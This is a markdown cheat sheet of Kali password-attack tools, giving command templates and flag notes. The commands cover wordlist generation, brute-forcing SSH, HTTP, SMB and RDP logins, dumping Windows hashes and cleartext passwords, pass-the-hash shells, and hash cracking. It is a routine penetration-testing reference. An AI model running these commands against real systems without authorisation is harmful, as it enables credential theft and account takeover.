# [cewl](https://tools.kali.org/password-attacks/cewl):
#### `cewl <website.com> -m 6 -w <file>`
  * -m sets the minimum word length
  * -w writes to a file

# [crunch](https://tools.kali.org/password-attacks/crunch):
#### `crunch 6 6 0123456879abcdef -o <file>`
   * first param is min password size
   * second param is max password size
   * custom alphabets supported
   * -t allows you to specify a pattern, but the syntax isn't intuitive
   
# [fgdump](https://web.archive.org/web/20191202010850/http://foofus.net/goons/fizzgig/fgdump/):
#### `fgdump.exe`
  * dumps password hashes from older Windows versions

# [hashcat](https://tools.kali.org/password-attacks/hashcat):
#### `hashcat -m 110 <file> <wordlist_file> --force`
  * -m specifies hash type; see the man page for reference
  * --force ignores warnings

# [hydra](https://tools.kali.org/password-attacks/hydra):
#### `hydra -l <username> -P <file> -t 10 ssh://X.X.X.X`
  * -l chooses username (caps for file)
  * -p chooses password (caps for file)
  * -t specifies number of tasks to run in parallel
  * -w makes hydra wait in between attempts to avoid being blocked

# [medusa](https://web.archive.org/web/20191115182453/https://www.mankier.com/1/medusa):
#### `medusa -h X.X.X.X -u <username> -P <file> -M http -m <directory> -T 20`
#### `medusa -H <host_file> -u <username> -M smbnt -m PASS:HASH`
  * -T determines number of threads
  * -M specifies the module to run
  * -m specifies parameters to pass
  * -n for non-default TCP port numbers
  * -f stops once a valid user/pass combo is found
  
# [ncrack](https://tools.kali.org/password-attacks/ncrack):
#### `ncrack -v -f --user <username> -P <file> rdp://X.X.X.X CL=1`
  * -CL determines number of open connections at a time
  * -f stops after a valid user/pass combo is found

# [pth suite](https://www.kali.org/tutorials/pass-the-hash-toolkit-winexe-updates/):
#### `pth-winexe -U  <username> //X.X.X.X cmd`
  * there are many modules in the pth suite, check them out

# [john the ripper](https://tools.kali.org/password-attacks/john):
#### `john <hash_file>`
#### `john --wordlist=<wordlist> <hash_file>
  * --wordlist[=<file>] allows you to give it the wordd you want to run against the hash
  * --fork[=n] allows you to spawn multiple processes
  * --session[=<name>] names a session that you can restore later
  * --restore[=<name>] restores the session
  * /etc/john/john.conf can be used to do password fuzzing on an existing wordlist (adding numbers for instance)

# [windows credential editor](https://web.archive.org/web/20191202011255/https://www.ampliasecurity.com/research/wcefaq.html):
#### `wce32.exe -w`
  * -w dumps cleartext logon passwords
  * -o specifies an output file
  * -g generates an NTLM hash for the supplied cleartext password
